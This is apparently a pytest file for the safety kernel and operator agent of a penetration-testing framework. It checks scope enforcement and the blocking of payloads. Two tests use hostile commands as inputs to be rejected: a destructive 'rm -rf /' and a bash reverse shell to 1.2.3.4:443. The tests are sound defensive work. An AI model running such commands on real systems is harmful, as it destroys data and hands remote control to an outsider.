"""Safety kernel and operator integration tests."""

from __future__ import annotations

import asyncio

import pytest

from nexus.core.types import (
    Asset,
    AssetType,
    AttackPath,
    AttackStep,
    CampaignMode,
    Scope,
    Severity,
)
from nexus.safety.kernel import SafetyKernel
from nexus.agents.operator import OperatorAgent


def test_scope_ip_allow():
    scope = Scope(name="test", ip_ranges=["10.0.0.0/24"])
    kernel = SafetyKernel(scope, CampaignMode.OBSERVE)
    assert kernel.check_scope("10.0.0.5") is True
    assert kernel.check_scope("10.0.0.5:8080") is True
    assert kernel.check_scope("192.168.1.1") is False


def test_scope_domain_allow():
    scope = Scope(
        name="test",
        domains=["lab.example.com"],
        hostnames=["jump.lab.example.com"],
    )
    kernel = SafetyKernel(scope, CampaignMode.OBSERVE)
    assert kernel.check_scope("lab.example.com") is True
    assert kernel.check_scope("api.lab.example.com") is True
    assert kernel.check_scope("jump.lab.example.com") is True
    assert kernel.check_scope("evil.example.com") is False


def test_scope_excluded_ip():
    scope = Scope(
        name="test",
        ip_ranges=["10.0.0.0/24"],
        excluded_ips=["10.0.0.1"],
    )
    kernel = SafetyKernel(scope, CampaignMode.OBSERVE)
    assert kernel.check_scope("10.0.0.5") is True
    assert kernel.check_scope("10.0.0.1") is False


def test_destructive_payload_blocked():
    scope = Scope(name="test", ip_ranges=["10.0.0.0/24"])
    kernel = SafetyKernel(scope, CampaignMode.PROVE)
    with pytest.raises(PermissionError):
        kernel.sanitize_payload("rm -rf /")


def test_observe_mode_blocks_payload():
    scope = Scope(name="test")
    kernel = SafetyKernel(scope, CampaignMode.OBSERVE)
    with pytest.raises(PermissionError):
        kernel.sanitize_payload("echo hello")


def test_safe_payload_passes():
    scope = Scope(name="test", ip_ranges=["10.0.0.0/24"])
    kernel = SafetyKernel(scope, CampaignMode.PROVE)
    result = kernel.sanitize_payload("Non-destructive PoC (config read)")
    assert "config read" in result


def test_reverse_shell_blocked():
    scope = Scope(name="test", ip_ranges=["10.0.0.0/24"])
    kernel = SafetyKernel(scope, CampaignMode.PROVE)
    with pytest.raises(PermissionError):
        kernel.sanitize_payload("bash -i >& /dev/tcp/1.2.3.4/443 0>&1")


def test_record_event_does_not_raise():
    scope = Scope(name="test", ip_ranges=["10.0.0.0/24"])
    kernel = SafetyKernel(scope, CampaignMode.PROVE)
    kernel._record_event("test_event", Severity.HIGH, "unit-test message")
    events = kernel.get_safety_events()
    assert len(events) == 1
    assert events[0].severity == Severity.HIGH


def test_operator_resolves_asset_address():
    scope = Scope(name="test", ip_ranges=["10.0.0.0/24"])
    kernel = SafetyKernel(scope, CampaignMode.PROVE)

    asset = Asset(
        type=AssetType.HOST,
        address="10.0.0.5",
        hostname=None,
        ports=[80],
    )
    step = AttackStep(
        technique_id="T1190",
        name="Test step",
        description="unit test",
        target_asset_id=asset.id,
        payload_summary="Non-destructive PoC (config read / math challenge)",
    )
    path = AttackPath(name="test-path", steps=[step])

    operator = OperatorAgent({})
    result_paths = asyncio.run(
        operator.execute_safe([path], kernel, CampaignMode.PROVE, assets=[asset])
    )
    assert result_paths[0].success is True
    assert result_paths[0].steps[0].evidence.get("target") == "10.0.0.5"


def test_operator_blocks_out_of_scope_target():
    scope = Scope(name="test", ip_ranges=["10.0.0.0/24"])
    kernel = SafetyKernel(scope, CampaignMode.PROVE)

    asset = Asset(
        type=AssetType.HOST,
        address="192.168.99.1",
        ports=[80],
    )
    step = AttackStep(
        technique_id="T1190",
        name="OOS step",
        description="unit test",
        target_asset_id=asset.id,
        payload_summary="Non-destructive PoC",
    )
    path = AttackPath(name="oos-path", steps=[step])

    operator = OperatorAgent({})
    result_paths = asyncio.run(
        operator.execute_safe([path], kernel, CampaignMode.PROVE, assets=[asset])
    )
    assert result_paths[0].success is False
    assert result_paths[0].steps[0].evidence.get("reason") == "safety_blocked"


def test_operator_multi_step_simulation():
    scope = Scope(name="test", domains=["lab.example.com"])
    kernel = SafetyKernel(scope, CampaignMode.SIMULATE)

    asset = Asset(
        type=AssetType.WEB_APP,
        address="lab.example.com",
        hostname="lab.example.com",
        ports=[443],
    )
    steps = [
        AttackStep(
            technique_id="T1190",
            name="Initial access",
            description="test",
            target_asset_id=asset.id,
            payload_summary="Non-destructive PoC",
        ),
        AttackStep(
            technique_id="T1078",
            name="Lateral sim",
            description="test",
            target_asset_id=asset.id,
            payload_summary="Simulated session token validation",
        ),
    ]
    path = AttackPath(name="multi", steps=steps, priority=7.0)

    operator = OperatorAgent({})
    result = asyncio.run(
        operator.execute_safe([path], kernel, CampaignMode.SIMULATE, assets=[asset])
    )
    assert result[0].success is True
    assert all(s.success for s in result[0].steps)
